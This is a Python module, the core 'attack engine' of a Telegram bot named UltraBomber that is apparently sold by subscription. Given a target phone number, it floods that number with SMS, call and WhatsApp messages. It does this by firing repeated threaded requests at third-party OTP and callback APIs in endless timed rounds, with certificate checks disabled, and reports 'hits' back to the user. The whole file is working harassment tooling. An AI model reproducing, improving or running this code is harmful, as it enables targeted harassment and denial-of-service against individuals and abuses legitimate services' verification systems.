"""UltraBomber — attack engine."""
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import requests
from telebot import types

from config import (
    logger, bot, MAX_WORKERS, SMS_MAX_WORKERS,
    DELAY_BETWEEN_ROUNDS, SMS_DELAY_BETWEEN_ROUNDS, SMS_DOUBLE_FIRE,
    IMPORTANT_CALL_INTERVAL, IMPORTANT_5S_INTERVAL, ADMIN_IDS
)
from database import admin_db
from apis import ALL_APIS, CALL_APIS, SMS_APIS, WHATSAPP_APIS, \
    IMPORTANT_CALL_APIS, IMPORTANT_5S_APIS


class UserData:
    def __init__(self):
        self.users = {}
        self.lock = threading.Lock()

    def clear_phone(self, chat_id):
        with self.lock:
            if chat_id in self.users:
                self.users[chat_id]["phone"] = None
                self.users[chat_id].pop("pending_mode", None)


user_data = UserData()
admin_data = {}


class UltraBomber:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        self.sms_executor = ThreadPoolExecutor(max_workers=SMS_MAX_WORKERS)
        self.http_session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=2)
        self.http_session.mount('https://', adapter)
        self.http_session.mount('http://', adapter)
        self.is_stopping = False

    def _fire_api(self, api, phone):
        try:
            url, headers, body = api.build_request(phone)
            headers["Accept"] = "application/json, text/plain, */*"
            headers["Connection"] = "keep-alive"
            if api.method.upper() == "POST":
                resp = self.http_session.post(url, headers=headers, data=body, timeout=8,
                                              allow_redirects=False, verify=False)
            elif api.method.upper() == "PUT":
                resp = self.http_session.put(url, headers=headers, data=body, timeout=8,
                                             allow_redirects=False, verify=False)
            else:
                resp = self.http_session.get(url, headers=headers, timeout=8,
                                             allow_redirects=False, verify=False)
            status = resp.status_code
            size = len(resp.content)
            success = 200 <= status < 400 and size > 5
            admin_db.update_api_stats(api.name, success)
            return api.name, status, size, success, None
        except Exception as e:
            admin_db.update_api_stats(api.name, False)
            return api.name, 0, 0, False, str(e)[:60]

    def _run_round(self, phone, apis, is_sms=False):
        executor = self.sms_executor if is_sms else self.executor
        fire_count = 2 if (is_sms and SMS_DOUBLE_FIRE) else 1
        futures = []
        for api in apis:
            if api.delay_ms > 0:
                time.sleep(api.delay_ms / 1000.0)
            for _ in range(fire_count):
                futures.append(executor.submit(self._fire_api, api, phone))
        ok_count = 0
        fail_count = 0
        for f in as_completed(futures):
            try:
                name, status, size, success, err = f.result(timeout=5)
                if success:
                    ok_count += 1
                else:
                    fail_count += 1
            except Exception:
                fail_count += 1
        return ok_count, fail_count

    def _worker(self, chat_id, stop_event):
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]
            mode = info["mode"]

        if mode == "call":
            apis = CALL_APIS
        elif mode == "whatsapp":
            apis = WHATSAPP_APIS
        elif mode == "sms":
            apis = SMS_APIS
        else:
            apis = ALL_APIS

        round_num = 0
        is_sms_mode = (mode == "sms")
        round_delay = SMS_DELAY_BETWEEN_ROUNDS if is_sms_mode else DELAY_BETWEEN_ROUNDS

        while not stop_event.is_set() and not self.is_stopping:
            round_num += 1
            try:
                ok, fail = self._run_round(phone, apis, is_sms=is_sms_mode)
                with self.lock:
                    if chat_id in self.sessions:
                        self.sessions[chat_id]["stats"]["ok"] += ok
                        self.sessions[chat_id]["stats"]["fail"] += fail
                        self.sessions[chat_id]["stats"]["rounds"] += 1
                        self.sessions[chat_id]["stats"]["total"] += ok + fail

                if round_num % 3 == 0 and not stop_event.is_set() and not self.is_stopping:
                    try:
                        with self.lock:
                            s = dict(self.sessions.get(chat_id, {}).get("stats", {}))
                        total = s.get('total', 0)
                        ok = s.get('ok', 0)
                        pct = (ok / max(total, 1)) * 100
                        bar_len = 30
                        filled = int(bar_len * pct / 100)
                        bar = "█" * filled + "░" * (bar_len - filled)
                        stop_markup = types.InlineKeyboardMarkup()
                        stop_markup.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing"))
                        bot.send_message(chat_id,
                            f"💣 *BOMBING ACTIVE* 💣\n"
                            f"────────────────────\n"
                            f"💣 Target: `{phone}`\n"
                            f"✅ Hits: {ok}/{total}\n"
                            f"📊 Progress: [{bar}] {pct:.1f}%\n"
                            f"⏱️ Rounds: {s.get('rounds', 0)}",
                            parse_mode="Markdown", reply_markup=stop_markup)
                    except Exception as e:
                        logger.error(f"Status send error: {e}")
            except Exception as e:
                logger.error(f"Worker error: {e}")
            time.sleep(round_delay)

    def _important_worker(self, chat_id, stop_event):
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]
        while not stop_event.is_set() and not self.is_stopping:
            try:
                futures = [self.executor.submit(self._fire_api, api, phone) for api in IMPORTANT_CALL_APIS]
                ok_count = 0
                fail_count = 0
                for f in as_completed(futures):
                    try:
                        name, status, size, success, err = f.result(timeout=5)
                        if success:
                            ok_count += 1
                        else:
                            fail_count += 1
                    except Exception:
                        fail_count += 1
                with self.lock:
                    if chat_id in self.sessions:
                        self.sessions[chat_id]["stats"]["ok"] += ok_count
                        self.sessions[chat_id]["stats"]["fail"] += fail_count
                        self.sessions[chat_id]["stats"]["total"] += ok_count + fail_count
            except Exception:
                pass
            time.sleep(IMPORTANT_CALL_INTERVAL)

    def _important_five_second_worker(self, chat_id, stop_event):
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]
        while not stop_event.is_set() and not self.is_stopping:
            try:
                futures = [self.executor.submit(self._fire_api, api, phone) for api in IMPORTANT_5S_APIS]
                local_ok = 0
                local_fail = 0
                for f in as_completed(futures):
                    try:
                        name, status, size, success, err = f.result(timeout=5)
                        if success:
                            local_ok += 1
                        else:
                            local_fail += 1
                    except Exception:
                        local_fail += 1
                if local_ok or local_fail:
                    with self.lock:
                        if chat_id in self.sessions:
                            self.sessions[chat_id]["stats"]["ok"] += local_ok
                            self.sessions[chat_id]["stats"]["fail"] += local_fail
                            self.sessions[chat_id]["stats"]["total"] += local_ok + local_fail
            except Exception:
                pass
            time.sleep(IMPORTANT_5S_INTERVAL)

    def start(self, chat_id, phone, mode, username=None):
        with self.lock:
            if chat_id in self.sessions:
                return False, "Already running! Pehle Stop karein."
            if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
                sub = admin_db.get_subscription(chat_id)
                if not sub:
                    return False, ("❌ *No Active Plan!*\n\nAapke paas koi active plan nahi hai.\n"
                                   "📋 Plans mein dekh kar key redeem karein.")
            admin_db.track_user(chat_id, username, phone, mode)
            self.is_stopping = False
            stop_event = threading.Event()
            stats = {"ok": 0, "fail": 0, "rounds": 0, "total": 0,
                     "start_time": datetime.now(), "elapsed": "0s"}
            self.sessions[chat_id] = {
                "phone": phone, "mode": mode, "stop_event": stop_event,
                "stats": stats, "thread": None, "imp_thread": None,
                "imp5s_thread": None, "user_id": chat_id, "username": username
            }
            thread = threading.Thread(target=self._worker, args=(chat_id, stop_event), daemon=True)
            thread.start()
            self.sessions[chat_id]["thread"] = thread
            if mode in ["call", "mix"]:
                imp_thread = threading.Thread(target=self._important_worker,
                                              args=(chat_id, stop_event), daemon=True)
                imp_thread.start()
                self.sessions[chat_id]["imp_thread"] = imp_thread
            imp5s_thread = threading.Thread(target=self._important_five_second_worker,
                                            args=(chat_id, stop_event), daemon=True)
            imp5s_thread.start()
            self.sessions[chat_id]["imp5s_thread"] = imp5s_thread
            try:
                stop_markup = types.InlineKeyboardMarkup()
                stop_markup.add(types.InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing"))
                bot.send_message(chat_id,
                    f"💣 *BOMBING ACTIVE* 💣\n"
                    f"────────────────────\n"
                    f"💣 Target: `{phone}`\n"
                    f"✅ Hits: 0/0\n"
                    f"📊 Progress: [{'░' * 30}] 0.0%\n"
                    f"🎯 Mode: *{mode.upper()}*\n"
                    f"📡 APIs: {len(ALL_APIS)}\n"
                    f"────────────────────\n"
                    f"⚡ Attack initiated...",
                    parse_mode="Markdown", reply_markup=stop_markup)
            except Exception as e:
                logger.error(f"Start message error: {e}")
            return True, f"🔥 *{mode.upper()} started for* `{phone}`"

    def stop(self, chat_id):
        with self.lock:
            if chat_id not in self.sessions:
                return False, "❌ Koi active session nahi hai."
            self.sessions[chat_id]["stop_event"].set()
            s = dict(self.sessions[chat_id]["stats"])
            start_time = s["start_time"]
            stats_snapshot = dict(s)
        time.sleep(2)
        elapsed = datetime.now() - start_time
        admin_db.update_stats(chat_id, stats_snapshot['ok'], stats_snapshot['fail'],
                              stats_snapshot['rounds'], stats_snapshot['total'])
        with self.lock:
            self.sessions.pop(chat_id, None)
        user_data.clear_phone(chat_id)
        total = stats_snapshot['total']
        ok = stats_snapshot['ok']
        pct = (ok / max(total, 1)) * 100
        bar_len = 30
        filled = int(bar_len * pct / 100)
        bar = "█" * filled + "░" * (bar_len - filled)
        return True, (f"💥 *BOMBING COMPLETE* 💥\n"
                     f"────────────────────\n"
                     f"✅ Final Hits: {ok}/{total}\n"
                     f"📊 Progress: [{bar}] {pct:.1f}%\n"
                     f"⏱️ Duration: {str(elapsed).split('.')[0]}\n"
                     f"🔄 Total Rounds: {stats_snapshot['rounds']}\n"
                     f"────────────────────\n"
                     f"🛑 Session terminated.")

    def get_status(self, chat_id):
        with self.lock:
            if chat_id not in self.sessions:
                return None
            s = self.sessions[chat_id]
            elapsed = datetime.now() - s["stats"]["start_time"]
            elapsed_str = str(elapsed).split('.')[0]
            s["stats"]["elapsed"] = elapsed_str
            return {
                "phone": s["phone"], "mode": s["mode"],
                "ok": s["stats"]["ok"], "fail": s["stats"]["fail"],
                "rounds": s["stats"]["rounds"], "total": s["stats"]["total"],
                "elapsed": elapsed_str
            }

    def stop_all(self):
        with self.lock:
            self.is_stopping = True
            ids = list(self.sessions.keys())
            for chat_id in ids:
                s = self.sessions[chat_id]["stats"]
                admin_db.update_stats(chat_id, s['ok'], s['fail'], s['rounds'], s['total'])
                self.sessions[chat_id]["stop_event"].set()
                user_data.clear_phone(chat_id)
            self.sessions.clear()
            return len(ids)


bomber = UltraBomber()
